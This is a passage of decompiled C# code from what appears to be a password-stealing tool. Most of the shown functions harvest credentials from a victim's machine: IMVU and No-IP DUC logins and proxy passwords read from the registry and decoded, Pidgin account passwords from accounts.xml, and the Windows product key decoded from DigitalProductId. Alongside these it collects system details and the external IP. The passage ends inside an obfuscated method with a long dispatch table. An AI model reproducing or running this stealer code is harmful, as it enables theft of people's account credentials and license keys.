		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://whatismyip.com/automation/n09230945.asp");
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "IP: " + streamReader.ReadToEnd() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Operating System Name: " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Computer Name: " + Environment.MachineName.ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Computer User Name: " + Environment.UserName.ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Main System Directory Location: " + Environment.SystemDirectory.ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Computer's been running for: " + Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5) + " Hours\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Phisical Memory Available: " + (double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1048576.0 + " MB\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Language: " + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Local Time: " + ((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().ToString() + "\r\n");
		RTPCInfo.set_Text(RTPCInfo.get_Text() + "Admin Account: " + text);
	}

	public object ReadKey(ref string hKey)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		object obj;
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell", ""));
					object[] array = new object[1] { hKey };
					bool[] array2 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet(objectValue, (Type)null, "regread", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					obj = RuntimeHelpers.GetObjectValue(obj2);
					goto end_IL_0000;
				}
				case 125:
					num = -1;
					switch (num2)
					{
					case 2:
						obj = "No IMVU Passwords Saved.";
						goto end_IL_0000;
					}
					break;
				}
				goto IL_00b7;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 125;
				continue;
			}
			break;
			IL_00b7:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		object result = obj;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string Hex2Ascii(string Text)
	{
		string result = default(string);
		try
		{
			object obj = null;
			object obj2 = default(object);
			object obj3 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
			{
				do
				{
					object obj4 = Mid(Text, Conversions.ToInteger(obj2), 2);
					obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
					obj2 = Operators.AddObject(obj2, (object)1);
				}
				while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
			}
			result = Conversions.ToString(obj);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void IMVU()
	{
		try
		{
			string hKey = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
			string hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
			RTIMVU.set_Text("-------------------------\r\n");
			RTIMVU.set_Text(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)(RTIMVU.get_Text() + "Username: "), ReadKey(ref hKey)), (object)"\r\n"), (object)"Password: "), (object)Hex2Ascii(Conversions.ToString(ReadKey(ref hKey2)))), (object)"\r\n")));
			RTIMVU.set_Text(RTIMVU.get_Text() + "-------------------------");
			if (RTIMVU.get_Text().Contains("No IMVU Passwords Saved."))
			{
				RTIMVU.set_Text("No IMVU Passwords Saved.");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string base64Decode(string data)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		string text2 = default(string);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					UTF8Encoding uTF8Encoding = new UTF8Encoding();
					Decoder decoder = uTF8Encoding.GetDecoder();
					byte[] array = Convert.FromBase64String(data);
					int charCount = decoder.GetCharCount(array, 0, array.Length);
					char[] array2 = new char[checked(charCount - 1 + 1)];
					decoder.GetChars(array, 0, array.Length, array2, 0);
					string text = new string(array2);
					text2 = text;
					break;
				}
				case 88:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_0092;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 88;
				continue;
			}
			break;
			IL_0092:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		string result = text2;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void NoIP()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object)null));
		string data = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object)null));
		string text2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object)null));
		string data2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object)null));
		string text3 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object)null));
		string text4 = "\r\n";
		RTNoIP.set_Text("Username: " + text + text4 + "Password: " + base64Decode(data) + text4 + "Proxy Username: " + text2 + text4 + "Proxy Password: " + base64Decode(data2) + text4 + "Proxy Port: " + text3 + text4 + text4);
		if (Operators.CompareString(text, "", false) == 0)
		{
			RTNoIP.set_Text("No No-IP Passwords Saved.");
		}
	}

	public string GetProductKey(string KeyPath, string ValueName)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue(KeyPath, ValueName, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = "";
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = "";
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = "";
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	public void WindowsKey()
	{
		RTWindowsKey.set_Text(((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + ": " + GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId"));
	}

	public object PidginRec()
	{
		object obj = default(object);
		try
		{
			string text = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
			string text2 = Conversions.ToString(1);
			string text3 = "\r\n";
			text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
			string text4 = null;
			string[] array = text2.Split(new char[1] { '\r' });
			text2 = null;
			string[] array2 = array;
			foreach (string text5 in array2)
			{
				text4 = ((!text5.Contains("<protocol>")) ? "No Pidgin Passwords Saved." : (text4 + text5 + text3));
				text4 = ((!text5.Contains("<name>")) ? "No Pidgin Passwords Saved." : (text4 + text5 + text3));
				text4 = ((!text5.Contains("<password>")) ? "No Pidgin Passwords Saved." : (text4 + text5 + text3 + text3));
			}
			obj = text4;
			RTPidgin.set_Text(Conversions.ToString(obj));
			return obj;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return obj;
		}
	}

	public void Pidgin()
	{
		PidginRec();
		if (Operators.CompareString(RTPidgin.get_Text(), "", false) == 0)
		{
			RTPidgin.set_Text("No Pidgin Passwords Saved.");
		}
	}

	public void pYrTgbzWFEpYpYrT()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		string text14 = default(string);
		string text15 = default(string);
		string text16 = default(string);
		string text17 = default(string);
		string text18 = default(string);
		string text19 = default(string);
		string text20 = default(string);
		string text21 = default(string);
		string text22 = default(string);
		string text23 = default(string);
		string text24 = default(string);
		string text25 = default(string);
		string text26 = default(string);
		string text27 = default(string);
		string text28 = default(string);
		string text29 = default(string);
		string text30 = default(string);
		string text31 = default(string);
		string text32 = default(string);
		string text33 = default(string);
		string text34 = default(string);
		string text35 = default(string);
		string text36 = default(string);
		string text37 = default(string);
		string text38 = default(string);
		string text39 = default(string);
		string text40 = default(string);
		string text41 = default(string);
		string text42 = default(string);
		string text43 = default(string);
		string text44 = default(string);
		string text45 = default(string);
		string text46 = default(string);
		string text47 = default(string);
		string text48 = default(string);
		string text49 = default(string);
		string text50 = default(string);
		string text51 = default(string);
		string text52 = default(string);
		string text53 = default(string);
		string text54 = default(string);
		string text55 = default(string);
		string text56 = default(string);
		string text57 = default(string);
		string text58 = default(string);
		string text59 = default(string);
		string text60 = default(string);
		string text61 = default(string);
		string text62 = default(string);
		string text63 = default(string);
		string text64 = default(string);
		string text65 = default(string);
		string text66 = default(string);
		string text67 = default(string);
		string text68 = default(string);
		string text69 = default(string);
		string text70 = default(string);
		string text71 = default(string);
		string text72 = default(string);
		string text73 = default(string);
		string text74 = default(string);
		string text75 = default(string);
		string text76 = default(string);
		string text77 = default(string);
		string text78 = default(string);
		string text79 = default(string);
		string text80 = default(string);
		string text81 = default(string);
		string text82 = default(string);
		string text83 = default(string);
		string text84 = default(string);
		string text85 = default(string);
		string text86 = default(string);
		string text87 = default(string);
		string text88 = default(string);
		string text89 = default(string);
		string text90 = default(string);
		string text91 = default(string);
		string text92 = default(string);
		string text93 = default(string);
		string text94 = default(string);
		string text95 = default(string);
		string text96 = default(string);
		string text97 = default(string);
		string text98 = default(string);
		string text99 = default(string);
		string text100 = default(string);
		string text101 = default(string);
		string text102 = default(string);
		string text103 = default(string);
		string text104 = default(string);
		string text105 = default(string);
		string text106 = default(string);
		string text107 = default(string);
		string text108 = default(string);
		string text109 = default(string);
		string text110 = default(string);
		string text111 = default(string);
		string text112 = default(string);
		string text113 = default(string);
		string text114 = default(string);
		string text115 = default(string);
		string text116 = default(string);
		string text117 = default(string);
		string text118 = default(string);
		string text119 = default(string);
		string text120 = default(string);
		string text121 = default(string);
		string text122 = default(string);
		string text123 = default(string);
		string text124 = default(string);
		string text125 = default(string);
		string text126 = default(string);
		string text127 = default(string);
		string text128 = default(string);
		string text129 = default(string);
		string text130 = default(string);
		string text131 = default(string);
		string text132 = default(string);
		string text133 = default(string);
		string text134 = default(string);
		string text135 = default(string);
		string text136 = default(string);
		string text137 = default(string);
		string text138 = default(string);
		string text139 = default(string);
		string text140 = default(string);
		string text141 = default(string);
		string text142 = default(string);
		string text143 = default(string);
		string text144 = default(string);
		string text145 = default(string);
		string text146 = default(string);
		string text147 = default(string);
		string text148 = default(string);
		string text149 = default(string);
		string text150 = default(string);
		string text151 = default(string);
		string text152 = default(string);
		string text153 = default(string);
		string text154 = default(string);
		string text155 = default(string);
		string text156 = default(string);
		string text157 = default(string);
		string text158 = default(string);
		string text159 = default(string);
		string text160 = default(string);
		string text161 = default(string);
		string text162 = default(string);
		string text163 = default(string);
		string text164 = default(string);
		string text165 = default(string);
		string text166 = default(string);
		string text167 = default(string);
		string text168 = default(string);
		string text169 = default(string);
		string text170 = default(string);
		string text171 = default(string);
		string text172 = default(string);
		string text173 = default(string);
		string text174 = default(string);
		string text175 = default(string);
		string text176 = default(string);
		string text177 = default(string);
		string text178 = default(string);
		string text179 = default(string);
		string text180 = default(string);
		string text181 = default(string);
		string text182 = default(string);
		string text183 = default(string);
		string text184 = default(string);
		string text185 = default(string);
		string text186 = default(string);
		string text187 = default(string);
		string text188 = default(string);
		string text189 = default(string);
		string text190 = default(string);
		string text191 = default(string);
		string text192 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 25661:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0026;
						case 4:
							goto IL_002e;
						case 5:
							goto IL_0048;
						case 6:
							goto IL_005e;
						case 7:
							goto IL_0068;
						case 8:
							goto IL_0070;
						case 9:
							goto IL_008a;
						case 10:
							goto IL_00a1;
						case 11:
							goto IL_00b1;
						case 12:
							goto IL_00bc;
						case 13:
							goto IL_00c4;
						case 14:
							goto IL_00de;
						case 15:
							goto IL_00f4;
						case 16:
							goto IL_0104;
						case 17:
							goto IL_010f;
						case 18:
							goto IL_0117;
						case 19:
							goto IL_0131;
						case 20:
							goto IL_0147;
						case 21:
							goto IL_0152;
						case 22:
							goto IL_0162;
						case 23:
							goto IL_016d;
						case 24:
							goto IL_0175;
						case 25:
							goto IL_018f;
						case 26:
							goto IL_01a5;
						case 27:
							goto IL_01b0;
						case 28:
							goto IL_01c0;
						case 29:
							goto IL_01cb;
						case 30:
							goto IL_01d3;
						case 31:
							goto IL_01ee;
						case 32:
							goto IL_0205;
						case 33:
							goto IL_0210;
						case 34:
							goto IL_0220;
						case 35:
							goto IL_022b;
						case 36:
							goto IL_0233;
						case 37:
							goto IL_024e;
						case 38:
							goto IL_0265;
						case 39:
							goto IL_0270;
						case 40:
							goto IL_0280;
						case 41:
							goto IL_028b;
						case 42:
							goto IL_0293;
						case 43:
							goto IL_02ae;
						case 44:
							goto IL_02c5;
						case 45:
							goto IL_02d0;
						case 46:
							goto IL_02e0;
						case 47:
							goto IL_02eb;
						case 48:
							goto IL_02f3;
						case 49:
							goto IL_030d;
						case 50:
							goto IL_0323;
						case 51:
							goto IL_0333;
						case 52:
							goto IL_033e;
						case 53:
							goto IL_0346;
						case 54:
							goto IL_0361;
						case 55:
							goto IL_0378;
						case 56:
							goto IL_0383;
						case 57:
							goto IL_0393;
						case 58:
							goto IL_039e;
						case 59:
							goto IL_03a6;
						case 60:
							goto IL_03c1;
						case 61:
							goto IL_03d8;
						case 62:
							goto IL_03e3;
						case 63:
							goto IL_03f3;
						case 64:
							goto IL_03fe;
						case 65:
							goto IL_0406;
						case 66:
							goto IL_0421;
						case 67:
							goto IL_0438;
						case 68:
							goto IL_0443;
						case 69:
							goto IL_0453;
						case 70:
							goto IL_045e;
						case 71:
							goto IL_0466;
						case 72:
							goto IL_0481;
						case 73:
							goto IL_0498;
						case 74:
							goto IL_04a3;
						case 75:
							goto IL_04b3;
						case 76:
							goto IL_04be;
						case 77:
							goto IL_04c6;
						case 78:
							goto IL_04e1;
						case 79:
							goto IL_04f8;
						case 80:
							goto IL_0503;
						case 81:
							goto IL_0513;
						case 82:
							goto IL_051e;
						case 83:
							goto IL_0526;
						case 84:
							goto IL_0541;
						case 85:
							goto IL_0558;
						case 86:
							goto IL_0563;
						case 87:
							goto IL_0573;
						case 88:
							goto IL_057e;
						case 89:
							goto IL_0586;
						case 90:
							goto IL_05a1;
						case 91:
							goto IL_05b8;
						case 92:
							goto IL_05c3;
						case 93:
							goto IL_05d3;
						case 94:
							goto IL_05de;
						case 95:
							goto IL_05e6;
						case 96:
							goto IL_0601;
						case 97:
							goto IL_0618;
						case 98:
							goto IL_0623;
						case 99:
							goto IL_0633;
						case 100:
							goto IL_063e;
						case 101:
							goto IL_0646;
						case 102:
							goto IL_0661;
						case 103:
							goto IL_0678;
						case 104:
							goto IL_0683;
						case 105:
							goto IL_0693;
						case 106:
							goto IL_069e;
						case 107:
							goto IL_06a6;
						case 108:
							goto IL_06c1;
						case 109:
							goto IL_06d8;
						case 110:
							goto IL_06e3;
						case 111:
							goto IL_06f3;
						case 112:
							goto IL_06fe;
						case 113:
							goto IL_0706;
						case 114:
							goto IL_0721;
						case 115:
							goto IL_0738;
						case 116:
							goto IL_0743;
						case 117:
							goto IL_0753;
						case 118:
							goto IL_075e;
						case 119:
							goto IL_0766;
						case 120:
							goto IL_0781;
						case 121:
							goto IL_0798;
						case 122:
							goto IL_07a3;
						case 123:
							goto IL_07b3;
						case 124:
							goto IL_07be;
						case 125:
							goto IL_07c6;
						case 126:
							goto IL_07e1;
						case 127:
							goto IL_07f8;
						case 128:
							goto IL_0803;
						case 129:
							goto IL_0816;
						case 130:
							goto IL_0824;
						case 131:
							goto IL_082c;
						case 132:
							goto IL_084a;
						case 133:
							goto IL_0864;
						case 134:
							goto IL_0872;
						case 135:
							goto IL_0885;
						case 136:
							goto IL_0893;
						case 137:
							goto IL_089b;
						case 138:
							goto IL_08b9;
						case 139:
							goto IL_08d3;
						case 140:
							goto IL_08e1;
						case 141:
							goto IL_08f4;
						case 142:
							goto IL_0902;
						case 143:
							goto IL_090a;
						case 144:
							goto IL_0928;
						case 145:
							goto IL_0942;
						case 146:
							goto IL_0950;
						case 147:
							goto IL_0963;
						case 148:
							goto IL_0971;
						case 149:
							goto IL_0979;
						case 150:
							goto IL_0997;
						case 151:
							goto IL_09b1;
						case 152:
							goto IL_09bf;
						case 153:
							goto IL_09d2;
						case 154:
							goto IL_09e0;
						case 155:
							goto IL_09e8;
						case 156:
							goto IL_0a06;
						case 157:
							goto IL_0a20;
						case 158:
							goto IL_0a2e;
						case 159:
							goto IL_0a41;
						case 160:
							goto IL_0a4f;
						case 161:
							goto IL_0a57;
						case 162:
							goto IL_0a75;
						case 163:
							goto IL_0a8f;
						case 164:
							goto IL_0a9d;
						case 165:
							goto IL_0ab0;
						case 166:
							goto IL_0abe;
						case 167:
							goto IL_0ac6;
						case 168:
							goto IL_0ae4;
						case 169:
							goto IL_0afe;
						case 170:
							goto IL_0b0c;
						case 171:
							goto IL_0b1f;
						case 172:
							goto IL_0b2d;
						case 173:
							goto IL_0b35;
						case 174:
							goto IL_0b53;
						case 175:
							goto IL_0b6d;
						case 176:
							goto IL_0b7b;
						case 177:
							goto IL_0b8e;
						case 178:
							goto IL_0b9c;
						case 179:
							goto IL_0ba4;
						case 180:
							goto IL_0bc2;
						case 181:
							goto IL_0bdc;
						case 182:
							goto IL_0bea;
						case 183:
							goto IL_0bfd;
						case 184:
							goto IL_0c0b;
						case 185:
							goto IL_0c13;
						case 186:
							goto IL_0c31;
						case 187:
							goto IL_0c4b;
						case 188:
							goto IL_0c59;
						case 189:
							goto IL_0c6c;
						case 190:
							goto IL_0c7a;
						case 191:
							goto IL_0c82;
						case 192:
							goto IL_0ca0;
						case 193:
							goto IL_0cba;
						case 194:
							goto IL_0cc8;
						case 195:
							goto IL_0cdb;
						case 196:
							goto IL_0ce9;
						case 197:
							goto IL_0cf1;
						case 198:
							goto IL_0d0f;
						case 199:
							goto IL_0d29;
						case 200:
							goto IL_0d37;
						case 201:
							goto IL_0d4a;
						case 202:
							goto IL_0d58;
						case 203:
							goto IL_0d60;
						case 204:
							goto IL_0d7e;
						case 205:
							goto IL_0d98;
						case 206:
							goto IL_0da6;
						case 207:
							goto IL_0db9;
						case 208:
							goto IL_0dc7;
						case 209:
							goto IL_0dcf;
						case 210:
							goto IL_0ded;
						case 211:
							goto IL_0e07;
						case 212:
							goto IL_0e15;
						case 213:
							goto IL_0e28;
						case 214:
							goto IL_0e36;
						case 215:
							goto IL_0e3e;
						case 216:
							goto IL_0e5c;
						case 217:
							goto IL_0e76;
						case 218:
							goto IL_0e84;
						case 219:
							goto IL_0e97;
						case 220:
							goto IL_0ea5;
						case 221:
							goto IL_0ead;
						case 222:
							goto IL_0ecb;
						case 223:
							goto IL_0ee5;
						case 224:
							goto IL_0ef3;
						case 225:
							goto IL_0f06;
						case 226:
							goto IL_0f14;
						case 227:
							goto IL_0f1c;
						case 228:
							goto IL_0f3a;
						case 229:
							goto IL_0f54;
						case 230:
							goto IL_0f62;
						case 231:
							goto IL_0f75;
						case 232:
							goto IL_0f83;
						case 233:
							goto IL_0f8b;
						case 234:
							goto IL_0fa9;
						case 235:
							goto IL_0fc3;
						case 236:
							goto IL_0fd1;
						case 237:
							goto IL_0fe4;
						case 238:
							goto IL_0ff2;
						case 239:
							goto IL_0ffa;
						case 240:
							goto IL_1018;
						case 241:
							goto IL_1032;
						case 242:
							goto IL_1040;
						case 243:
							goto IL_1053;
						case 244:
							goto IL_1061;
						case 245:
							goto IL_1069;
						case 246:
							goto IL_1087;
						case 247:
							goto IL_10a1;
						case 248:
							goto IL_10af;
						case 249:
							goto IL_10c2;
						case 250:
							goto IL_10d0;
						case 251:
							goto IL_10d8;
						case 252:
							goto IL_10f6;
						case 253:
							goto IL_1110;
						case 254:
							goto IL_111e;
						case 255:
							goto IL_1131;
						case 256:
							goto IL_113f;
						case 257:
							goto IL_1147;
						case 258:
							goto IL_1165;
						case 259:
							goto IL_117f;
						case 260:
							goto IL_118d;
						case 261:
							goto IL_11a0;
						case 262:
							goto IL_11ae;
						case 263:
							goto IL_11b6;
						case 264:
							goto IL_11d4;
						case 265:
							goto IL_11ee;
						case 266:
							goto IL_11fc;
						case 267:
							goto IL_120f;
						case 268:
							goto IL_121d;
						case 269:
							goto IL_1225;
						case 270:
							goto IL_1243;
						case 271:
							goto IL_125d;
						case 272:
							goto IL_126b;
						case 273:
							goto IL_127e;
						case 274:
							goto IL_128c;
						case 275:
							goto IL_1294;
						case 276:
							goto IL_12b2;
						case 277:
							goto IL_12cc;
						case 278:
							goto IL_12da;
						case 279:
							goto IL_12ed;
						case 280:
							goto IL_12fb;
						case 281:
							goto IL_1303;
						case 282:
							goto IL_1321;
						case 283:
							goto IL_133b;
						case 284:
							goto IL_1349;
						case 285:
							goto IL_135c;
						case 286:
							goto IL_136a;
						case 287:
							goto IL_1372;
						case 288:
							goto IL_1390;
						case 289:
							goto IL_13aa;
						case 290:
							goto IL_13b8;
						case 291:
							goto IL_13cb;
						case 292:
							goto IL_13d9;
						case 293:
							goto IL_13e1;
						case 294:
							goto IL_13ff;
						case 295:
							goto IL_1419;
						case 296:
							goto IL_1427;
						case 297:
							goto IL_143a;
						case 298:
							goto IL_1448;
						case 299:
							goto IL_1450;
						case 300:
							goto IL_146e;
						case 301:
							goto IL_1488;
						case 302:
							goto IL_1496;
						case 303:
							goto IL_14a9;
						case 304:
							goto IL_14b7;
						case 305:
							goto IL_14bf;
						case 306:
							goto IL_14dd;
						case 307:
							goto IL_14f7;
						case 308:
							goto IL_1505;
						case 309:
							goto IL_1518;
						case 310:
							goto IL_1526;
						case 311:
							goto IL_152e;
						case 312:
							goto IL_154c;
						case 313:
							goto IL_1566;
						case 314:
							goto IL_1574;
						case 315:
							goto IL_1587;
						case 316:
							goto IL_1595;
						case 317:
							goto IL_159d;
						case 318:
							goto IL_15bb;
						case 319:
							goto IL_15d5;
						case 320:
							goto IL_15e3;
						case 321:
							goto IL_15f6;
						case 322:
							goto IL_1604;
						case 323:
							goto IL_160c;
						case 324:
							goto IL_162a;
						case 325:
							goto IL_1644;
						case 326:
							goto IL_1652;
						case 327:
							goto IL_1665;
						case 328:
							goto IL_1673;
						case 329:
							goto IL_167b;
						case 330:
							goto IL_1699;
						case 331:
							goto IL_16b3;
						case 332:
							goto IL_16c1;
						case 333:
							goto IL_16d4;
						case 334:
							goto IL_16e2;
						case 335:
							goto IL_16ea;
						case 336:
							goto IL_1708;
						case 337:
							goto IL_1722;
						case 338:
							goto IL_1730;
						case 339:
							goto IL_1743;
						case 340:
							goto IL_1751;
						case 341:
							goto IL_1759;
						case 342:
							goto IL_1777;
						case 343:
							goto IL_1791;
						case 344:
							goto IL_179f;
						case 345:
							goto IL_17b2;
						case 346:
							goto IL_17c0;
						case 347:
							goto IL_17c8;
						case 348:
							goto IL_17e6;
						case 349:
							goto IL_1800;
						case 350:
							goto IL_180e;
						case 351:
							goto IL_1821;
						case 352:
							goto IL_182f;
						case 353:
							goto IL_1837;
						case 354:
							goto IL_1855;
						case 355:
							goto IL_186f;
						case 356:
							goto IL_187d;
						case 357:
							goto IL_1890;
						case 358:
							goto IL_189e;
						case 359:
							goto IL_18a6;
						case 360:
							goto IL_18c4;
						case 361:
							goto IL_18de;
						case 362:
							goto IL_18ec;
						case 363:
							goto IL_18ff;
						case 364:
							goto IL_190d;
						case 365:
							goto IL_1915;
						case 366:
							goto IL_1933;
						case 367:
							goto IL_194d;
						case 368:
							goto IL_195b;
						case 369:
							goto IL_196e;
						case 370:
							goto IL_197c;
						case 371:
							goto IL_1984;
						case 372:
							goto IL_19a2;
						case 373:
							goto IL_19bc;
						case 374:
							goto IL_19ca;
						case 375:
							goto IL_19dd;
						case 376:
							goto IL_19eb;
						case 377:
							goto IL_19f3;
						case 378:
							goto IL_1a11;
						case 379:
							goto IL_1a2b;
						case 380:
							goto IL_1a39;
						case 381:
							goto IL_1a4c;
						case 382:
							goto IL_1a5a;
						case 383:
							goto IL_1a62;
						case 384:
							goto IL_1a80;
						case 385:
							goto IL_1a9a;
						case 386:
							goto IL_1aa8;
						case 387:
							goto IL_1abb;
						case 388:
							goto IL_1ac9;
						case 389:
							goto IL_1ad1;
						case 390:
							goto IL_1aef;
						case 391:
							goto IL_1b09;
						case 392:
							goto IL_1b17;
						case 393:
							goto IL_1b2a;
						case 394:
							goto IL_1b38;
						case 395:
							goto IL_1b40;
						case 396:
							goto IL_1b5e;
						case 397:
							goto IL_1b78;
						case 398:
							goto IL_1b86;
						case 399:
							goto IL_1b99;
						case 400:
							goto IL_1ba7;
						case 401:
							goto IL_1baf;
						case 402:
							goto IL_1bcd;
						case 403:
							goto IL_1be7;
						case 404:
							goto IL_1bf5;
						case 405:
							goto IL_1c08;
						case 406:
							goto IL_1c16;
						case 407:
							goto IL_1c1e;
						case 408:
							goto IL_1c3c;
						case 409:
							goto IL_1c56;
						case 410:
							goto IL_1c64;
						case 411:
							goto IL_1c77;
						case 412:
							goto IL_1c85;
						case 413:
							goto IL_1c8d;
						case 414:
							goto IL_1cab;
						case 415:
							goto IL_1cc5;
						case 416:
							goto IL_1cd3;
						case 417:
							goto IL_1ce6;
						case 418:
							goto IL_1cf4;
						case 419:
							goto IL_1cfc;
						case 420:
							goto IL_1d1a;
						case 421:
							goto IL_1d34;
						case 422:
							goto IL_1d42;
						case 423:
							goto IL_1d55;
						case 424:
							goto IL_1d63;
						case 425:
							goto IL_1d6b;
						case 426:
							goto IL_1d89;
						case 427:
							goto IL_1da3;
						case 428:
							goto IL_1db1;
						case 429:
							goto IL_1dc4;
						case 430:
							goto IL_1dd2;
						case 431:
							goto IL_1dda;
						case 432:
							goto IL_1df8;
						case 433:
							goto IL_1e12;
						case 434:
							goto IL_1e20;
						case 435:
							goto IL_1e33;
						case 436:
							goto IL_1e41;
						case 437:
							goto IL_1e49;
						case 438:
							goto IL_1e67;
						case 439:
							goto IL_1e81;
						case 440:
							goto IL_1e8f;
						case 441:
							goto IL_1ea2;
						case 442:
							goto IL_1eb0;
						case 443:
